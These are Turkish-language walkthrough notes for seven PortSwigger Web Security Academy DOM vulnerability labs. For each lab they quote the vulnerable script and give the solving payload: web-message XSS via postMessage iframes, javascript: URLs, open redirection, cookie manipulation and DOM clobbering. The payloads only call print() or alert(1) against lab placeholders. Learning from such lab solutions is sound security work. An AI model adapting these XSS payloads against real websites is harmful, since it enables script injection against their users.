                      DOM-based vulnerabilities
                      DOM tabanlı güvenlik açıkları
    ################################################
		#			DOM XSS using web messages               #
		#			Web mesajlarını kullanan DOM XSS         #
		################################################

1--> anasayfa kaynak kodlarındaki zaafiyetli kod bloğu aşağıdaki gibidir.
                    <script>
                        window.addEventListener('message', function(e) {
                            document.getElementById('ads').innerHTML = e.data;
                        })
                    </script>

exploit servere iframe kodu içerisinde postMessage fonksiyonu ile ekleyip kurbana yollayınca payloadımız çalışıyor.
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">

    ###########################################################
		#			DOM XSS using web messages and a JavaScript URL     #
		#			Web mesajlarını kullanan DOM XSS                    #
		###########################################################

2--> anasayfa kaynak kodlarındaki zaafiyetli kod bloğu aşağıdaki gibidir.
                    <script>
                        window.addEventListener('message', function(e) {
                            var url = e.data;
                            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                                location.href = url;
                            }
                        }, false);
                    </script>

exploit servere iframe kodu içerisinde postMessage fonksiyonu ile ekleyip kurbana yollayınca payloadımız çalışıyor.
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">

    ##########################################################
		#			DOM XSS using web messages and JSON.parse          #
		#			Web mesajlarını kullanan DOM XSS ve JSON.parse     #
		##########################################################

3--> anasayfa kaynak kodlarındaki zaafiyetli kod bloğu aşağıdaki gibidir.
                    <script>
                        window.addEventListener('message', function(e) {
                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
                            document.body.appendChild(iframe);
                            try {
                                d = JSON.parse(e.data);
                            } catch(e) {
                                return;
                            }
                            switch(d.type) {
                                case "page-load":
                                    ACMEplayer.element.scrollIntoView();
                                    break;
                                case "load-channel":
                                    ACMEplayer.element.src = d.url;
                                    break;
                                case "player-height-changed":
                                    ACMEplayer.element.style.width = d.width + "px";
                                    ACMEplayer.element.style.height = d.height + "px";
                                    break;
                            }
                        }, false);
                    </script>

exploit servere iframe kodu içerisinde postMessage fonksiyonu ile ekleyip kurbana yollayınca payloadımız çalışıyor.
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>

    ##########################################
		#			DOM-based open redirection         #
		#			DOM tabanlı açık yönlendirme       #
		##########################################

4--> blog yazısında bloğun anasayfasına dönmeye çalışan zaafiyetli kodlar aşağıdaki gibidir.
Parametre, url"Blog'a Geri Dön" bağlantısının kullanıcıyı götürdüğü yeri değiştirmenize olanak tanıyan bir açık yeniden yönlendirme güvenlik açığı içerir.
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>

urlden yapıştırıp back to blog linkine tıklayınca çalışıyor.
https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/

    ##########################################
		#			DOM-based cookie manipulation      #
		#			DOM tabanlı çerez manipülasyonu    #
		##########################################

5--> view details kısmına girildiğinde sayfa kodlarında aşağıdaki zafiyetli kod bloğuyla karşılaşıyoruz.
                       
                        <script>
                            document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
                        </script>
aşağıdaki istismarı store edip deliver to victim yapınca exploit server üzerinden sonuca ulaşıyoruz.
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">

    #######################################################################
		#			Exploiting DOM clobbering to enable XSS                         #
		#			XSS'yi etkinleştirmek için DOM hırsızlığından yararlanma        #
		#######################################################################

6--> bloga yorum olarak ilk aşağıdaki exploiti yapıştırıp yorum atıyoruz.
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">

sonra ikinci defa normal yorum atıp sonuca ulaşıyoruz.
Burada zaafiyetin kaynaklandığı kod bloğu içe javascript dosyası aktarıyor ve yorumu javascript dosyasında çalıştırdığı için exploit gerçekleşiyor.
<script>loadComments('/post/comment')</script>

    #######################################################################
		#			Clobbering DOM attributes to bypass HTML filters                #
		#			HTML filtrelerini atlamak için DOM niteliklerini gizleme        #
		#######################################################################

7--> Blog gönderilerinden birine gidin ve aşağıdaki HTML'yi içeren bir yorum oluşturun:
<form id=x tabindex=0 onfocus=print()><input id=attributes>
Sonra exploit servere gidip aşağıdaki kodu çalıştırın
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">
postid parametresinin güncellenmesi de gerekiyor ve çalışıyor.
